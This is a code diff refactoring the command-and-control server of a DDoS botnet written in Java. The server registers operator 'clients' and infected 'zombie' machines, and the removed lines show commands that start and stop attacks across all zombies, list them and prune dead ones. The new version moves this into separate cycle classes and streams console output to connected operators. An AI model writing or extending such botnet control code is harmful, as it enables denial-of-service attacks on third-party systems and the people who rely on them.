@@ -3,11 +3,8 @@ package org.ddos.server;
 import java.io.EOFException;
 import java.io.IOException;
 import java.io.Serializable;
-import java.io.StreamCorruptedException;
-import java.net.SocketAddress;
 import java.net.SocketException;
 import java.util.ArrayList;
-import java.util.Date;
 
 import org.jnetwork.DataPackage;
 import org.jnetwork.Server;
@@ -19,6 +16,7 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 	private static final long serialVersionUID = -4786497469961089553L;
 
 	private Server server;
+	public ArrayList<SocketPackage> readingClients = new ArrayList<>();
 
 	public Server getServer() {
 		return server;
@@ -33,77 +31,17 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 		try {
 			DataPackage initialPackage = (DataPackage) event.getInputStream().readSpecificType(DataPackage.class);
 			boolean isClient = !(boolean) initialPackage.getObjects()[0];
-			System.out.println(
-					event.getConnection().getRemoteSocketAddress() + " connected: " + (isClient ? "client" : "zombie"));
+			println(event.getConnection().getRemoteSocketAddress() + " connected: " + (isClient ? "client" : "zombie"));
 
 			server.setConnectionData(event, !isClient, null);
 
 			if (isClient) {
-				while (!event.getConnection().isClosed()) {
-					DataPackage pkgIn = (DataPackage) event.getInputStream().readSpecificType(DataPackage.class);
-					System.out.println("Package received: " + pkgIn.getMessage() + " (ID: " + pkgIn.getId() + ")");
-					if (pkgIn.getMessage().equals("START_DDOS")) {
-						for (SocketPackage zombie : server.getClients()) {
-							if ((boolean) zombie.getExtraData()[0]) {
-								if (zombie.getExtraData()[1] != null) {
-									zombie.getOutputStream().writeObject(new DataPackage().setMessage("STOP_DDOS"));
-								}
-								zombie.getOutputStream().writeObject(pkgIn);
-								server.setConnectionData(zombie, true, pkgIn.getObjects()[0]);
-							}
-						}
-					} else if (pkgIn.getMessage().equals("STOP_DDOS")) {
-						for (SocketPackage zombie : server.getClientsByData(true, pkgIn.getObjects()[0])) {
-							zombie.getOutputStream().writeObject(pkgIn);
-							server.setConnectionData(zombie, true, null);
-						}
-					} else if (pkgIn.getMessage().equals("KICK_ZOMBIES")) {
-						for (SocketAddress zombie : (SocketAddress[]) pkgIn.getObjects()) {
-							server.removeClient(zombie);
-						}
-					} else if (pkgIn.getMessage().equals("LIST_ZOMBIES")) {
-						ArrayList<SocketAddress> addrs = new ArrayList<>();
-						for (SocketPackage connected : server.getClients())
-							if ((boolean) connected.getExtraData()[0])
-								addrs.add(connected.getConnection().getRemoteSocketAddress());
-
-						event.getOutputStream().writeObject(
-								new DataPackage((Serializable[]) addrs.toArray(new SocketAddress[addrs.size()]))
-										.setMessage("ZOMBIES_LIST"));
-					} else if (pkgIn.getMessage().equals("KICK_ALL_ZOMBIES")) {
-						for (SocketPackage zombie : server.getClients()) {
-							if ((boolean) zombie.getExtraData()[0]) {
-								server.removeClient(zombie);
-							}
-						}
-					} else if (pkgIn.getMessage().equals("REMOVE_DEAD_ZOMBIES")) {
-						for (SocketPackage zombie : server.getClients()) {
-							if ((boolean) zombie.getExtraData()[0]) {
-								try {
-									zombie.getOutputStream()
-											.writeObject(new DataPackage().setMessage("DEAD_ZOMBIE_CHECK"));
-								} catch (IOException e) {
-									System.out.println(
-											"Removing dead zombie: " + zombie.getConnection().getRemoteSocketAddress());
-									server.removeClient(zombie);
-								}
-							}
-						}
-					}
-				}
+				ClientCycle cycle = new ClientCycle();
+				cycle.start(this, server, event);
 			} else {
-				try {
-					Object waiter = new Object();
-					synchronized (waiter) {
-						waiter.wait();
-					}
-				} catch (InterruptedException e) {
-					return;
-				}
+				ZombieCycle cycle = new ZombieCycle();
+				cycle.start(this, server, event);
 			}
-		} catch (StreamCorruptedException e) {
-			System.err.println(new Date() + " " + event.getConnection().getRemoteSocketAddress() + " STREAM CORRUPTED: "
-					+ e.getMessage());
 		} catch (SocketException | EOFException e) {
 			return;
 		} catch (Exception e) {
@@ -114,6 +52,18 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 
 	@Override
 	public void clientDisconnected(SocketPackage event) {
-		System.out.println(event.getConnection().getRemoteSocketAddress() + " disconnected.");
+		try {
+			println(event.getConnection().getRemoteSocketAddress() + " disconnected.");
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+	}
+
+	private void println(Serializable o) throws IOException {
+		System.out.println(o);
+
+		for (SocketPackage client : readingClients) {
+			client.getOutputStream().writeObject(new DataPackage(o).setMessage("CONSOLE_OUTPUT"));
+		}
 	}
 }
